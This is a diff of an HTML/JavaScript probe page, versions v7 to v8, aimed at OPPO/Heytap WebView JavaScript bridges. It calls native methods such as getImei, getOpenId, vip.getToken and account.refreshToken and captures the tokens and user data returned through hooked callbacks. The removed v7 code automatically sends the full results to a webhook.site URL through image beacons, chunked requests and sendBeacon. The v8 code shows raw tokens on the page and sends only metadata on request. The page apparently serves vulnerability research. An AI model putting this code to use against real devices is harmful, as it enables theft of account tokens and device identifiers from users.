@@ -2,68 +2,143 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>OPPO Sensitive Callback Probe v7</title>
+  <title>OPPO HeytapNativeApi Local Sensitive Probe v8</title>
   <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes">
   <style>
     * { box-sizing: border-box; }
-    body { margin:0; padding:22px 16px 90px; background:#050505; color:#f5f5f5; font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; font-size:22px; line-height:1.45; }
-    h1 { margin:0 0 12px; font-size:38px; line-height:1.12; }
-    .warn { color:#ff5470; font-weight:900; font-size:23px; }
-    .box { background:#121212; border:1px solid #444; border-radius:18px; padding:14px; margin:14px 0; word-break:break-word; }
-    button { width:100%; border:0; border-radius:16px; padding:18px; margin:8px 0; font-size:22px; font-weight:900; background:#43d08d; color:#07140d; }
-    button.secondary { background:#e9e9e9; color:#111; }
-    button.danger { background:#ff5470; color:#111; }
-    .status { font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; white-space:pre-wrap; font-size:19px; }
-    .card { background:#151515; border:1px solid #333; border-radius:18px; padding:14px; margin:12px 0; }
-    .card h2 { margin:0 0 10px; font-size:25px; }
-    .ok { color:#5cff9f; font-weight:900; }
-    .bad { color:#ff667f; font-weight:900; }
-    .muted { color:#aaa; }
-    .kv { font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:17px; white-space:pre-wrap; word-break:break-word; }
-    pre { display:none; background:#eee; color:#111; border-radius:12px; padding:14px; font-size:15px; white-space:pre-wrap; word-break:break-word; }
+    body {
+      margin: 0;
+      padding: 22px 16px 90px;
+      background: #050505;
+      color: #f5f5f5;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      font-size: 22px;
+      line-height: 1.45;
+    }
+    h1 { margin: 0 0 12px; font-size: 36px; line-height: 1.12; }
+    .warn { color: #ff5470; font-weight: 900; font-size: 22px; margin: 12px 0 18px; }
+    .box {
+      background: #121212;
+      border: 1px solid #444;
+      border-radius: 18px;
+      padding: 14px;
+      margin: 14px 0;
+      word-break: break-word;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      border-radius: 12px;
+      border: 1px solid #444;
+      background: #111;
+      color: #a6ffcb;
+      font-size: 16px;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    }
+    button {
+      width: 100%;
+      border: 0;
+      border-radius: 16px;
+      padding: 18px;
+      margin: 8px 0;
+      font-size: 22px;
+      font-weight: 900;
+      background: #43d08d;
+      color: #07140d;
+    }
+    button.secondary { background: #e9e9e9; color: #111; }
+    button.danger { background: #ff5470; color: #111; }
+    .status {
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      white-space: pre-wrap;
+      font-size: 18px;
+    }
+    .card {
+      background: #151515;
+      border: 1px solid #333;
+      border-radius: 18px;
+      padding: 14px;
+      margin: 12px 0;
+    }
+    .card h2 { margin: 0 0 10px; font-size: 25px; }
+    .ok { color: #5cff9f; font-weight: 900; }
+    .bad { color: #ff667f; font-weight: 900; }
+    .muted { color: #aaa; }
+    .kv {
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      font-size: 16px;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+    pre {
+      display: none;
+      background: #eee;
+      color: #111;
+      border-radius: 12px;
+      padding: 14px;
+      font-size: 14px;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
   </style>
 </head>
 <body>
-<h1>OPPO Sensitive Callback Probe v7</h1>
-<p class="warn">Goal: detect callback-delivered IMEI/OpenID/login/user data, not only direct return values.</p>
+<h1>OPPO HeytapNativeApi Local Sensitive Probe v8</h1>
+<p class="warn">This version focuses only on HeytapNativeApi / HeytapJsApi.callback. Raw callback responses are displayed locally on this phone page. Webhook sends metadata only and only when you press the metadata button.</p>
 
-<div id="target" class="box status"></div>
+<div class="box status" id="envBox">LOADING</div>
 
-<button onclick="runSensitiveCallbackSweep()">Run sensitive callback sweep</button>
-<button class="secondary" onclick="runDirectRawAgain()">Run direct raw again</button>
-<button class="secondary" onclick="pingWebhook()">Ping webhook</button>
-<button class="danger" onclick="navigateWebhook()">NAVIGATE webhook ping</button>
+<div class="box">
+  <div style="font-weight:900;margin-bottom:8px;">Metadata webhook target, raw values are not sent by this page:</div>
+  <input id="webhookInput" value="https://webhook.site/3947f7d3-968a-409a-9d5f-3bc7003d3df2">
+</div>
+
+<button onclick="runHeytapProbe()">Run HeytapNativeApi local probe</button>
+<button class="secondary" onclick="sendMetadataOnly()">Send metadata only once</button>
+<button class="secondary" onclick="copyFullLocalJson()">Copy full local JSON</button>
 <button class="secondary" onclick="toggleJson()">Toggle full JSON</button>
+<button class="danger" onclick="navigateMetadataPing()">NAVIGATE metadata ping</button>
 
 <div id="status" class="box status">WAITING</div>
 <div id="cards"></div>
 <pre id="out"></pre>
 
 <script>
-(function(){
-  const WEBHOOK = "https://webhook.site/0b200f5d-c245-4872-bbe3-edde79de0fee";
-  const VERSION = "sensitive_callback_probe_v7";
-  const ACTIONS = [
-    "account_islogin",
-    "account_get_userid",
-    "account_get_userinfo",
-    "get_open_id",
-    "get_imei",
-    "get_channel_id"
-  ];
-  const DIRECT_METHODS = ["getImei","getOpenId","getLoginInfo","isLogin","getChannelId"];
-  const CALLBACK_KEYS = [
-    "callback","callbackName","callback_name","cb","cbName","jsCallback","js_callback",
-    "success","successCallback","complete","completeCallback","onSuccess","onComplete",
-    "function","func","handler","callbackId","callback_id"
+(function () {
+  const VERSION = "heytap_local_sensitive_probe_v8";
+
+  const HEYTAP_METHODS = [
+    "vip.getToken",
+    "vip.getClientContext",
+    "account.refreshToken"
   ];
 
-  window.__OPPO_V7_WEBHOOK = WEBHOOK;
-  window.__OPPO_V7_CALLBACKS = [];
-  window.__OPPO_V7_LAST_PAYLOAD = null;
+  const EXTRA_METHODS = [
+    "account.getToken",
+    "account.getUserInfo",
+    "account.getUserId",
+    "account.isLogin",
+    "user.getInfo",
+    "user.getToken",
+    "vip.getUserInfo",
+    "vip.getUserId"
+  ];
 
-  document.getElementById("target").textContent =
-    "WEBHOOK=" + WEBHOOK + "\nVERSION=" + VERSION + "\nbridge=" + (!!window.android) + "\nua=" + navigator.userAgent;
+  const ALL_METHODS = HEYTAP_METHODS.concat(EXTRA_METHODS);
+
+  window.__OPPO_V8 = {
+    version: VERSION,
+    callbacks: [],
+    invokes: [],
+    errors: [],
+    started: false,
+    originalCallback: null,
+    finalPayload: null
+  };
+
+  function webhookBase() {
+    return (document.getElementById("webhookInput").value || "").trim().replace(/\/+$/, "");
+  }
 
   function safeString(x) {
     try {
@@ -72,246 +147,346 @@
       if (typeof x === "string") return x;
       if (typeof x === "number" || typeof x === "boolean") return String(x);
       return JSON.stringify(x);
-    } catch(e) {
-      try { return String(x); } catch(_) { return "[unstringifiable]"; }
+    } catch (e) {
+      try { return String(x); } catch (_) { return "[unstringifiable]"; }
     }
   }
 
   function short(x, n) {
     const s = safeString(x);
-    return s.length <= n ? s : s.slice(0,n) + "...[+" + (s.length-n) + " chars]";
+    return s.length <= n ? s : s.slice(0, n) + "...[+" + (s.length - n) + " chars]";
   }
 
-  function describeBridge() {
-    const a = window.android;
-    if (!a || typeof a !== "object") return { exists:false, type:typeof a };
-    let ownKeys = [], functionKeys = [];
-    try {
-      ownKeys = Object.getOwnPropertyNames(a).slice(0,200);
-      functionKeys = ownKeys.filter(k => { try { return typeof a[k] === "function"; } catch(e){ return false; } });
-    } catch(e) {}
-    return { exists:true, type:typeof a, tag:Object.prototype.toString.call(a), ownKeys, functionKeys };
-  }
-
-  function base(eventType, reason) {
+  function containsFlags(raw) {
+    const s = safeString(raw);
+    const lower = s.toLowerCase();
     return {
-      eventType, version: VERSION, ts: new Date().toISOString(), reason,
-      location: { href: location.href, origin: location.origin, protocol: location.protocol, referrer: document.referrer || null },
-      environment: { userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language, cookieEnabled: navigator.cookieEnabled, webdriver: navigator.webdriver },
-      androidBridge: describeBridge()
+      length: s.length,
+      nonEmpty: s !== "" && s !== "undefined" && s !== "null",
+      contains_ssoid: lower.includes("ssoid"),
+      contains_authToken: lower.includes("authtoken") || lower.includes("auth_token"),
+      contains_token: lower.includes("token"),
+      contains_userId: lower.includes("userid") || lower.includes("user_id") || lower.includes("uid"),
+      contains_openId: lower.includes("openid") || lower.includes("open_id"),
+      contains_guid: lower.includes("guid"),
+      contains_ouid: lower.includes("ouid"),
+      contains_phone: lower.includes("phone"),
+      contains_email: lower.includes("email")
     };
   }
 
-  function callBridge(method, args) {
-    const item = { method, args: args || [], exists:false, ok:false, returnType:null, rawReturnValue:null, empty:null, error:null };
+  function describeObject(name) {
+    const obj = window[name];
+    if (!obj) return { name, exists: false, type: typeof obj };
+    let keys = [];
+    let functionKeys = [];
     try {
-      const a = window.android;
-      if (!a || typeof a !== "object") { item.error = "window.android missing"; return item; }
-      item.exists = typeof a[method] === "function";
-      if (!item.exists) { item.error = "missing_or_not_function"; return item; }
-      const ret = a[method].apply(a, args || []);
-      const raw = safeString(ret);
-      item.ok = true; item.returnType = typeof ret; item.rawReturnValue = raw;
-      item.empty = raw === "" || raw === "undefined" || raw === "null";
-      return item;
-    } catch(e) {
-      item.error = String(e && (e.stack || e.message || e));
-      return item;
-    }
-  }
-
-  function callOneArg(method, arg, meta) {
-    const item = { bridgeMethod: method, arg, meta: meta || null, exists:false, ok:false, returnType:null, rawReturnValue:null, empty:null, error:null };
-    try {
-      const a = window.android;
-      if (!a || typeof a !== "object") { item.error = "window.android missing"; return item; }
-      item.exists = typeof a[method] === "function";
-      if (!item.exists) { item.error = "missing_or_not_function"; return item; }
-      const ret = a[method](arg);
-      const raw = safeString(ret);
-      item.ok = true; item.returnType = typeof ret; item.rawReturnValue = raw;
-      item.empty = raw === "" || raw === "undefined" || raw === "null";
-      return item;
-    } catch(e) {
-      item.error = String(e && (e.stack || e.message || e));
-      return item;
-    }
-  }
-
-  function send(payload) {
-    window.__OPPO_V7_LAST_PAYLOAD = payload;
-    const json = JSON.stringify(payload);
-    try { new Image().src = WEBHOOK + "/v7-ping?event=" + encodeURIComponent(payload.eventType) + "&t=" + Date.now() + "&bridge=" + encodeURIComponent(!!window.android); } catch(e) {}
-    try { new Image().src = WEBHOOK + "/v7-summary?event=" + encodeURIComponent(payload.eventType) + "&t=" + Date.now() + "&d=" + encodeURIComponent(json.slice(0,2500)); } catch(e) {}
-    try {
-      const enc = encodeURIComponent(json);
-      const size = 1500;
-      const total = Math.ceil(enc.length / size);
-      for (let i=0; i<Math.min(total,18); i++) {
-        const img = new Image();
-        img.src = WEBHOOK + "/v7-chunk?event=" + encodeURIComponent(payload.eventType) + "&idx=" + i + "&total=" + total + "&t=" + Date.now() + "&d=" + enc.slice(i*size,(i+1)*size);
-      }
+      keys = Object.getOwnPropertyNames(obj).slice(0, 160);
+      functionKeys = keys.filter(k => {
+        try { return typeof obj[k] === "function"; } catch(e) { return false; }
+      });
     } catch(e) {}
-    try { navigator.sendBeacon(WEBHOOK + "/v7-beacon?event=" + encodeURIComponent(payload.eventType), new Blob([json], {type:"text/plain"})); } catch(e) {}
+    return {
+      name,
+      exists: true,
+      type: typeof obj,
+      tag: Object.prototype.toString.call(obj),
+      ownKeys: keys,
+      functionKeys
+    };
+  }
+
+  function basePayload(eventType, reason) {
+    return {
+      eventType,
+      version: VERSION,
+      ts: new Date().toISOString(),
+      reason,
+      location: {
+        href: location.href,
+        origin: location.origin,
+        protocol: location.protocol,
+        referrer: document.referrer || null
+      },
+      environment: {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        cookieEnabled: navigator.cookieEnabled,
+        webdriver: navigator.webdriver
+      },
+      objects: {
+        android: describeObject("android"),
+        HeytapNativeApi: describeObject("HeytapNativeApi"),
+        HeytapJsApi: describeObject("HeytapJsApi")
+      }
+    };
+  }
+
+  function updateEnv() {
+    document.getElementById("envBox").textContent =
+      "VERSION=" + VERSION + "\n" +
+      "href=" + location.href + "\n" +
+      "ua=" + navigator.userAgent + "\n" +
+      "window.android=" + (!!window.android) + "\n" +
+      "window.HeytapNativeApi=" + (!!window.HeytapNativeApi) + "\n" +
+      "window.HeytapJsApi=" + (!!window.HeytapJsApi);
+  }
+
+  function installHeytapCallbackHook() {
+    window.HeytapJsApi = window.HeytapJsApi || {};
+    if (!window.__OPPO_V8.originalCallbackCaptured) {
+      window.__OPPO_V8.originalCallback = window.HeytapJsApi.callback;
+      window.__OPPO_V8.originalCallbackCaptured = true;
+    }
+
+    window.HeytapJsApi.callback = function(callbackId, response) {
+      const raw = safeString(response);
+      const entry = {
+        name: "HeytapJsApi.callback",
+        callbackId: safeString(callbackId),
+        ts: new Date().toISOString(),
+        rawResponse_LOCAL_SCREEN_ONLY: raw,
+        metadata: containsFlags(raw)
+      };
+
+      window.__OPPO_V8.callbacks.push(entry);
+
+      const payload = buildFinalPayload("OPPO_V8_HEYTAP_CALLBACK_FIRED", "heytap_callback_fired");
+      payload.latestCallback_LOCAL_SCREEN_ONLY = entry;
+      render(payload);
+
+      const original = window.__OPPO_V8.originalCallback;
+      if (typeof original === "function") {
+        try { return original.apply(this, arguments); } catch(e) {
+          window.__OPPO_V8.errors.push({
+            where: "original_HeytapJsApi.callback",
+            error: String(e && (e.stack || e.message || e)),
+            ts: new Date().toISOString()
+          });
+        }
+      }
+      return undefined;
+    };
+  }
+
+  function invokeHeytap(method, args, callbackId) {
+    const item = {
+      method,
+      args: args,
+      callbackId,
+      exists: false,
+      ok: false,
+      returnType: null,
+      rawReturnValue: null,
+      error: null,
+      ts: new Date().toISOString()
+    };
+
+    try {
+      if (!window.HeytapNativeApi || typeof window.HeytapNativeApi.invoke !== "function") {
+        item.error = "HeytapNativeApi.invoke missing";
+        window.__OPPO_V8.invokes.push(item);
+        return item;
+      }
+
+      item.exists = true;
+      const ret = window.HeytapNativeApi.invoke(method, args, callbackId);
+      item.ok = true;
+      item.returnType = typeof ret;
+      item.rawReturnValue = safeString(ret);
+      window.__OPPO_V8.invokes.push(item);
+      return item;
+    } catch(e) {
+      item.error = String(e && (e.stack || e.message || e));
+      window.__OPPO_V8.errors.push({
+        where: "HeytapNativeApi.invoke",
+        method,
+        callbackId,
+        error: item.error,
+        ts: new Date().toISOString()
+      });
+      window.__OPPO_V8.invokes.push(item);
+      return item;
+    }
+  }
+
+  function buildFinalPayload(eventType, reason) {
+    const payload = basePayload(eventType, reason);
+    payload.rawSensitiveValuesSentToWebhook = false;
+    payload.rawSensitiveValuesDisplayedLocally = true;
+    payload.invokes = window.__OPPO_V8.invokes;
+    payload.callbacks_LOCAL_SCREEN_ONLY = window.__OPPO_V8.callbacks;
+    payload.callbackMetadata = window.__OPPO_V8.callbacks.map(c => ({
+      name: c.name,
+      callbackId: c.callbackId,
+      ts: c.ts,
+      metadata: c.metadata,
+      rawValueSentToWebhook: false
+    }));
+    payload.errors = window.__OPPO_V8.errors;
+    window.__OPPO_V8.finalPayload = payload;
+    return payload;
   }
 
   function render(payload) {
     document.getElementById("status").textContent =
-      payload.eventType + "\n" + payload.ts + "\nbridge=" + (!!window.android) + "\ncallbackCount=" + (window.__OPPO_V7_CALLBACKS || []).length;
+      payload.eventType + "\n" +
+      payload.ts + "\n" +
+      "HeytapNativeApi=" + (!!window.HeytapNativeApi) + "\n" +
+      "HeytapJsApi=" + (!!window.HeytapJsApi) + "\n" +
+      "invokeCount=" + window.__OPPO_V8.invokes.length + "\n" +
+      "callbackCount=" + window.__OPPO_V8.callbacks.length;
+
     document.getElementById("out").textContent = JSON.stringify(payload, null, 2);
+
     const root = document.getElementById("cards");
     root.innerHTML = "";
 
-    const callbacks = payload.callbacks || [];
-    const nonEmptyCallbacks = callbacks.filter(c => {
-      const raw = safeString(c.args);
-      return raw && raw !== "[]" && raw !== "undefined" && raw !== "null";
+    const existCard = document.createElement("div");
+    existCard.className = "card";
+    existCard.innerHTML =
+      "<h2>" + payload.eventType + "</h2>" +
+      "<div class='kv'>" +
+      "HeytapNativeApi.exists=" + payload.objects.HeytapNativeApi.exists + "\n" +
+      "HeytapNativeApi.functions=" + safeString(payload.objects.HeytapNativeApi.functionKeys) + "\n" +
+      "HeytapJsApi.exists=" + payload.objects.HeytapJsApi.exists + "\n" +
+      "callbacks=" + window.__OPPO_V8.callbacks.length +
+      "</div>";
+    root.appendChild(existCard);
+
+    const callbacks = window.__OPPO_V8.callbacks || [];
+    const hotCallbacks = callbacks.filter(c => c.metadata && c.metadata.nonEmpty);
+
+    const hotCard = document.createElement("div");
+    hotCard.className = "card";
+    if (hotCallbacks.length) {
+      hotCard.innerHTML = "<h2 class='ok'>CALLBACK_NON_EMPTY count=" + hotCallbacks.length + "</h2>";
+      hotCallbacks.forEach(c => {
+        const d = document.createElement("div");
+        d.className = "kv";
+        d.style.marginTop = "12px";
+        d.textContent =
+          "callbackId=" + c.callbackId + "\n" +
+          "flags=" + JSON.stringify(c.metadata, null, 2) + "\n" +
+          "RAW_LOCAL_ONLY=" + short(c.rawResponse_LOCAL_SCREEN_ONLY, 2500);
+        hotCard.appendChild(d);
+      });
+    } else {
+      hotCard.innerHTML = "<h2 class='bad'>NO_NON_EMPTY_CALLBACK_YET</h2><div class='kv'>No callback-delivered token/user data observed yet.</div>";
+    }
+    root.appendChild(hotCard);
+
+    const invCard = document.createElement("div");
+    invCard.className = "card";
+    invCard.innerHTML = "<h2>Invokes</h2>";
+    window.__OPPO_V8.invokes.forEach(i => {
+      const d = document.createElement("div");
+      d.className = "kv";
+      d.style.marginTop = "10px";
+      d.textContent =
+        "method=" + i.method + "\n" +
+        "callbackId=" + i.callbackId + "\n" +
+        "ok=" + i.ok + "\n" +
+        "returnType=" + i.returnType + "\n" +
+        "return=" + short(i.rawReturnValue, 600) + "\n" +
+        "error=" + short(i.error, 1000);
+      invCard.appendChild(d);
+    });
+    root.appendChild(invCard);
+  }
+
+  window.runHeytapProbe = function() {
+    updateEnv();
+    window.__OPPO_V8.callbacks = [];
+    window.__OPPO_V8.invokes = [];
+    window.__OPPO_V8.errors = [];
+    window.__OPPO_V8.started = true;
+
+    installHeytapCallbackHook();
+
+    const prePayload = buildFinalPayload("OPPO_V8_HEYTAP_PRECHECK", "precheck_before_invoke");
+    render(prePayload);
+
+    if (!window.HeytapNativeApi || typeof window.HeytapNativeApi.invoke !== "function") {
+      const p = buildFinalPayload("OPPO_V8_HEYTAP_NOT_FOUND", "HeytapNativeApi.invoke_missing");
+      render(p);
+      return;
+    }
+
+    let idx = 1;
+    ALL_METHODS.forEach(method => {
+      const cbId = "OPPO_AUDIT_" + method.replace(/[^a-zA-Z0-9_]/g, "_") + "_" + String(idx++).padStart(3, "0");
+      invokeHeytap(method, "{}", cbId);
     });
 
-    const top = document.createElement("div");
-    top.className = "card";
-    top.innerHTML = "<h2>" + payload.eventType + "</h2><div class='kv'>callbacks=" + callbacks.length + "\nnonEmptyCallbacks=" + nonEmptyCallbacks.length + "\nresults=" + ((payload.results||[]).length) + "</div>";
-    root.appendChild(top);
+    const p1 = buildFinalPayload("OPPO_V8_HEYTAP_INVOKE_DONE", "after_invoke_sync");
+    render(p1);
 
-    const cbCard = document.createElement("div");
-    cbCard.className = "card";
-    if (nonEmptyCallbacks.length) {
-      cbCard.innerHTML = "<h2 class='ok'>CALLBACK_NON_EMPTY count=" + nonEmptyCallbacks.length + "</h2>";
-      nonEmptyCallbacks.slice(0,20).forEach(c => {
-        const d = document.createElement("div");
-        d.className = "kv";
-        d.style.marginTop = "10px";
-        d.textContent = "name=" + c.name + "\nargs=" + short(c.args, 1600) + "\nmeta=" + short(c.meta, 800);
-        cbCard.appendChild(d);
-      });
-    } else {
-      cbCard.innerHTML = "<h2 class='bad'>NO_CALLBACK_DATA_YET</h2><div class='kv'>No callback-delivered non-empty sensitive/account value observed.</div>";
-    }
-    root.appendChild(cbCard);
-
-    const results = payload.results || [];
-    const nonEmptyReturns = results.filter(r => r.ok && !r.empty && safeString(r.rawReturnValue) !== "");
-    const retCard = document.createElement("div");
-    retCard.className = "card";
-    if (nonEmptyReturns.length) {
-      retCard.innerHTML = "<h2 class='ok'>RETURN_NON_EMPTY count=" + nonEmptyReturns.length + "</h2>";
-      nonEmptyReturns.slice(0,30).forEach(r => {
-        const d = document.createElement("div");
-        d.className = "kv";
-        d.style.marginTop = "10px";
-        d.textContent = "method=" + (r.method || r.bridgeMethod) + "\narg=" + short(r.arg || r.args, 900) + "\nrawReturnValue=" + short(r.rawReturnValue, 1200);
-        retCard.appendChild(d);
-      });
-    } else {
-      retCard.innerHTML = "<h2 class='bad'>NO_NON_EMPTY_RETURN</h2>";
-    }
-    root.appendChild(retCard);
-
-    send(payload);
-  }
-
-  function registerCallback(name, meta) {
-    window[name] = function() {
-      const args = Array.prototype.slice.call(arguments).map(safeString);
-      const entry = { name, meta: meta || null, ts: new Date().toISOString(), args };
-      window.__OPPO_V7_CALLBACKS.push(entry);
-      const payload = base("OPPO_V7_CALLBACK_FIRED", "native_callback");
-      payload.callback = entry;
-      payload.callbacks = window.__OPPO_V7_CALLBACKS;
-      render(payload);
-      return "OPPO_V7_CALLBACK_RECEIVED";
-    };
-  }
-
-  function prepareCallbacks() {
-    window.__OPPO_V7_CALLBACKS = [];
-    const generic = [
-      "callback","cb","success","complete","onSuccess","onComplete",
-      "oppoCallback","oppoJsCallback","nativeCallback","jsCallback",
-      "OPPO_CALLBACK","OPPO_JS_CALLBACK","OPPO_NATIVE_CALLBACK"
-    ];
-    generic.forEach(n => registerCallback(n, {kind:"generic"}));
-  }
-
-  window.runSensitiveCallbackSweep = function() {
-    prepareCallbacks();
-    const payload = base("OPPO_V7_SENSITIVE_CALLBACK_SWEEP_RESULT", "manual_sensitive_callback_sweep");
-    const results = [];
-    let idx = 0;
-
-    for (const action of ACTIONS) {
-      for (const key of CALLBACK_KEYS) {
-        const cbName = "OPPO_CB_" + idx++;
-        registerCallback(cbName, { action, key, bridge:"dispatcher" });
-
-        const variants = [
-          { type: action, [key]: cbName },
-          { type: action, data: {}, [key]: cbName },
-          { type: action, params: {}, [key]: cbName },
-          { id: "oppo_audit_" + action + "_" + key, type: action, data: {}, [key]: cbName },
-          { id: "oppo_audit_" + action + "_" + key, type: action, params: {}, [key]: cbName }
-        ];
-
-        for (const v of variants) {
-          const arg = JSON.stringify(v);
-          results.push(callOneArg("callNativeApi", arg, { action, key, cbName }));
-          results.push(callOneArg("callAsyncNativeApi", arg, { action, key, cbName }));
-        }
-      }
-    }
-
-    for (const method of DIRECT_METHODS) {
-      for (let j=0; j<8; j++) {
-        const cbName = "OPPO_DIRECT_CB_" + method + "_" + j;
-        registerCallback(cbName, { method, bridge:"direct" });
-        const argsList = [
-          [cbName],
-          [JSON.stringify({ callback: cbName })],
-          [JSON.stringify({ callbackName: cbName })],
-          [JSON.stringify({ cb: cbName })],
-          [JSON.stringify({ jsCallback: cbName })],
-          [JSON.stringify({ success: cbName })],
-          [JSON.stringify({ complete: cbName })],
-          [JSON.stringify({ id: cbName })]
-        ];
-        results.push(callBridge(method, argsList[j]));
-      }
-    }
-
-    payload.results = results;
-    payload.callbacks = window.__OPPO_V7_CALLBACKS;
-    render(payload);
-
-    setTimeout(function(){
-      const p2 = base("OPPO_V7_SENSITIVE_CALLBACK_SWEEP_AFTER_1500MS", "after_wait_1500ms");
-      p2.results = results;
-      p2.callbacks = window.__OPPO_V7_CALLBACKS;
+    setTimeout(function() {
+      const p2 = buildFinalPayload("OPPO_V8_HEYTAP_AFTER_1500MS", "after_wait_1500ms");
       render(p2);
     }, 1500);
 
-    setTimeout(function(){
-      const p3 = base("OPPO_V7_SENSITIVE_CALLBACK_SWEEP_AFTER_5000MS", "after_wait_5000ms");
-      p3.results = results;
-      p3.callbacks = window.__OPPO_V7_CALLBACKS;
+    setTimeout(function() {
+      const p3 = buildFinalPayload("OPPO_V8_HEYTAP_AFTER_5000MS", "after_wait_5000ms");
       render(p3);
     }, 5000);
   };
 
-  window.runDirectRawAgain = function() {
-    const payload = base("OPPO_V7_DIRECT_RAW_RESULT", "manual_direct_raw_again");
-    payload.results = DIRECT_METHODS.concat(["getPackageName","getDeviceModel","getNetworkType","getRomVersion","getRomVersionCode"]).map(m => callBridge(m, []));
-    payload.callbacks = window.__OPPO_V7_CALLBACKS || [];
-    render(payload);
+  window.sendMetadataOnly = function() {
+    const p = window.__OPPO_V8.finalPayload || buildFinalPayload("OPPO_V8_METADATA_ONLY_MANUAL", "manual_metadata");
+    const metadata = {
+      eventType: "OPPO_V8_HEYTAP_METADATA_ONLY",
+      version: VERSION,
+      ts: new Date().toISOString(),
+      rawSensitiveValuesSentToWebhook: false,
+      href: location.href,
+      ua: navigator.userAgent,
+      objects: {
+        HeytapNativeApi: p.objects.HeytapNativeApi,
+        HeytapJsApi: p.objects.HeytapJsApi
+      },
+      invokeCount: window.__OPPO_V8.invokes.length,
+      callbackCount: window.__OPPO_V8.callbacks.length,
+      callbackMetadata: p.callbackMetadata || [],
+      errors: window.__OPPO_V8.errors
+    };
+
+    const base = webhookBase();
+    const json = JSON.stringify(metadata);
+    if (!base) {
+      alert("Webhook URL empty");
+      return;
+    }
+
+    try {
+      new Image().src = base + "/v8-heytap-metadata?event=OPPO_V8_HEYTAP_METADATA_ONLY&t=" + Date.now() + "&d=" + encodeURIComponent(json.slice(0, 7000));
+    } catch(e) {}
+
+    try {
+      navigator.sendBeacon(base + "/v8-heytap-metadata-beacon", new Blob([json], { type: "text/plain" }));
+    } catch(e) {}
+
+    document.getElementById("status").textContent += "\nmetadata send attempted";
   };
 
-  window.pingWebhook = function() {
-    const payload = base("OPPO_V7_PING", "manual_ping");
-    payload.callbacks = window.__OPPO_V7_CALLBACKS || [];
-    render(payload);
+  window.navigateMetadataPing = function() {
+    const base = webhookBase();
+    location.href = base + "/v8-nav-ping?event=OPPO_V8_NAV_PING&t=" + Date.now() + "&heytap=" + encodeURIComponent(!!window.HeytapNativeApi);
   };
 
-  window.navigateWebhook = function() {
-    location.href = WEBHOOK + "/v7-nav-ping?event=OPPO_V7_NAV_PING&t=" + Date.now() + "&bridge=" + encodeURIComponent(!!window.android) + "&ua=" + encodeURIComponent(navigator.userAgent.slice(0,180));
+  window.copyFullLocalJson = function() {
+    const text = document.getElementById("out").textContent || "{}";
+    try {
+      navigator.clipboard.writeText(text).then(function(){
+        alert("Copied full local JSON");
+      }, function(){
+        alert("Clipboard API failed. Toggle full JSON and copy manually.");
+      });
+    } catch(e) {
+      alert("Clipboard API unavailable. Toggle full JSON and copy manually.");
+    }
   };
 
   window.toggleJson = function() {
@@ -319,7 +494,8 @@
     p.style.display = p.style.display === "block" ? "none" : "block";
   };
 
-  setTimeout(function(){ pingWebhook(); }, 1000);
+  updateEnv();
+  render(buildFinalPayload("OPPO_V8_PAGE_LOADED", "page_loaded"));
 })();
 </script>
 </body>
